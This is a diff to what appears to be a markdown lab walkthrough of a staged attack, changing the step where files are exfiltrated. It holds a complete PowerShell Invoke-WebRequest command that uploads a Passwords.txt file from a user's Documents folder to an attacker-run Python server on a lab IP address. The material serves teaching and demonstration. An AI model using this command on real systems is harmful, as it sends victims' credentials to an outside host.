@@ -141,17 +141,18 @@ At this point they’re ready to begin the second stage of the attack. They’ve
 <img src="analysis/screenshots_v1/Figure_10.png" alt="Upload success" width="65%"><br>
 
 
-This is the full PowerShell command to upload the Passwords.txt file to the attacker's Python server:
+This is the full PowerShell command to upload the `Passwords.txt` file to the attacker's Python server:
  ```powershell
 powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
 # ⚠️ Make sure to update the IP address to match your attacker's listener
+```
+```
 ```
 
 *In Figure 11, you can see in the second terminal and is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*
 
 <br><sub>(Figure 11)</sub><br>
 <img src="analysis/screenshots_v1/Figure_11.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
-Then, run the following PowerShell command to upload the `Passwords.txt` file to the attacker's Python server:
 
 ---
 
